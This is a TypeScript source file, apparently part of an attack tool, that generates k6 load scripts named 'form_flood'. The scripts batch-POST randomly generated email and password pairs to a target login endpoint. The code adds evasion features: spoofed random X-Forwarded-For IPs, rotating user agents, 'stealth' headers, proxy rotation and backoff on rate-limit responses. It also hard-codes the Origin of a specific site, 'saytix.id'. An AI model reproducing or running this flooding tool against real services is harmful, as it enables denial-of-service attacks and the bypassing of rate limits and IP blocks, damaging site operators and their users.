import type { AttackOptions } from "../runner.js";
import { sanitizeForScript } from "../../utils/sanitizer.js";
import { generateStealthHelpersScript } from "./utils/stealth.js";

function buildThresholds(opts: AttackOptions): string {
	if (!opts.thresholds || opts.thresholds.length === 0) return "";
	const grouped: Record<string, string[]> = {};
	for (const t of opts.thresholds) {
		const colonIndex = t.indexOf(":");
		if (colonIndex === -1) continue;
		const metric = t.slice(0, colonIndex);
		const condition = t.slice(colonIndex + 1);
		if (!grouped[metric]) grouped[metric] = [];
		grouped[metric].push(condition);
	}
	const lines = Object.entries(grouped).map(([metric, conditions]) => {
		const conditionsStr = conditions.map((c) => JSON.stringify(c)).join(", ");
		return `    "${metric}": [${conditionsStr}]`;
	});
	return `,
    thresholds: {
${lines.join(",\n")}
    }`;
}

export function formFlood2Template(opts: AttackOptions): string {
	const headersStr = Object.entries(opts.headers)
		.map(([k, v]) => `${sanitizeForScript(k)}: ${sanitizeForScript(v)}`)
		.join(", ");

	const batchSize = Math.min(Math.max(opts.rpsPerVu || 10, 1), 50);

	const hasProxyList = opts.proxyList.length > 0;

	const checkBlock = opts.noCheck
		? ""
		: `  for (const res of responses) {
    check(res, {
      "status was 200": (r) => r.status === 200 || r.status === 422 || r.status === 401,
    });
  }`;

	const randomDataHelpers = `
// Realistic User Agents
const USER_AGENTS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Edg/120.0.0.0"
];

function randomUserAgent() {
  return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
}

// Random email generator
function randomEmail() {
  const domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'mail.com'];
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let username = '';
  for (let i = 0; i < 10; i++) {
    username += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return username + '@' + domains[Math.floor(Math.random() * domains.length)];
}

// Random password generator
function randomPassword() {
  const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*';
  let password = '';
  const length = 8 + Math.floor(Math.random() * 8);
  for (let i = 0; i < length; i++) {
    password += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return password;
}

// Generate login credentials
function generateLoginData() {
  return {
    email: randomEmail(),
    password: randomPassword()
  };
}
`;

	const xffScript = `
function randomIP() {
  const ranges = [[1, 126], [128, 191], [192, 223]];
  const range = ranges[Math.floor(Math.random() * ranges.length)];
  const a = Math.floor(Math.random() * (range[1] - range[0] + 1)) + range[0];
  const b = Math.floor(Math.random() * 256);
  const c = Math.floor(Math.random() * 256);
  const d = Math.floor(Math.random() * 254) + 1;
  return a + "." + b + "." + c + "." + d;
}
`;

	const proxyRotationScript = hasProxyList
		? `
const PROXY_LIST = JSON.parse(__ENV.PROXY_LIST || "[]");
function randomProxy() {
  if (PROXY_LIST.length === 0) return undefined;
  return PROXY_LIST[Math.floor(Math.random() * PROXY_LIST.length)];
}
`
		: "";

	const defaultHeaders = headersStr || `"User-Agent": randomUserAgent()`;

	const proxyParam = hasProxyList
		? `    const proxyUrl = randomProxy();\n`
		: "";
	const proxyObj = hasProxyList
		? `, ...(proxyUrl ? { proxy: proxyUrl } : {})`
		: "";

	const buildRequestParams = (headerExpr: string) =>
		`{ headers: ${headerExpr}, timeout: "15s"${proxyObj} }`;

	const stealthBlock = opts.stealth
		? `${generateStealthHelpersScript()}
${xffScript}${randomDataHelpers}${proxyRotationScript}
const BASE_HEADERS = { 
  ${defaultHeaders},
  "Content-Type": "application/json",
  "Accept": "application/json, text/plain, */*",
  "Referer": ${sanitizeForScript(opts.target)},
  "Origin": "https://saytix.id"
};

export default function () {
  const stealthHeaders = generateStealthHeaders();
  const mergedHeaders = Object.assign({}, BASE_HEADERS, stealthHeaders, { "X-Forwarded-For": randomIP() });
${proxyParam}
  const params = ${buildRequestParams("mergedHeaders")};

  const requests = [];
  for (let i = 0; i < BATCH_SIZE; i++) {
    const loginData = generateLoginData();
    const payload = JSON.stringify(loginData);
    requests.push(["POST", TARGET, payload, params]);
  }

  const responses = http.batch(requests);
  ${checkBlock}
  
  let has429 = false;
  for (const res of responses) {
    if (res && res.status === 429) {
      has429 = true;
      break;
    }
  }
  if (has429) {
    handleBackoff({ status: 429 });
  }
  
  stealthSleep();
}`
		: `${xffScript}${randomDataHelpers}${proxyRotationScript}
const HEADERS = { 
  ${defaultHeaders},
  "Content-Type": "application/json",
  "Accept": "application/json, text/plain, */*",
  "Accept-Language": "en-US,en;q=0.9,id;q=0.8",
  "Accept-Encoding": "gzip, deflate, br",
  "Referer": ${sanitizeForScript(opts.target)},
  "Origin": "https://saytix.id",
  "X-Forwarded-For": randomIP()
};

export default function () {
  const reqHeaders = Object.assign({}, HEADERS, { "X-Forwarded-For": randomIP() });
${proxyParam}
  const params = ${buildRequestParams("reqHeaders")};

  const requests = [];
  for (let i = 0; i < BATCH_SIZE; i++) {
    const loginData = generateLoginData();
    const payload = JSON.stringify(loginData);
    requests.push(["POST", TARGET, payload, params]);
  }

  const responses = http.batch(requests);
${checkBlock}
}`;

	const optionsBlock = `  scenarios: {
    form_flood: {
      executor: "constant-vus",
      vus: ${opts.vus},
      duration: ${sanitizeForScript(opts.duration)},
      gracefulStop: "5s",
    },
  },`;

	const thresholdBlock = buildThresholds(opts);

	return `import http from "k6/http";
import { check, sleep } from "k6";

export const options = {
${optionsBlock}${thresholdBlock}
};

const TARGET = ${sanitizeForScript(opts.target)};
const BATCH_SIZE = ${batchSize};

${stealthBlock}
`;
}
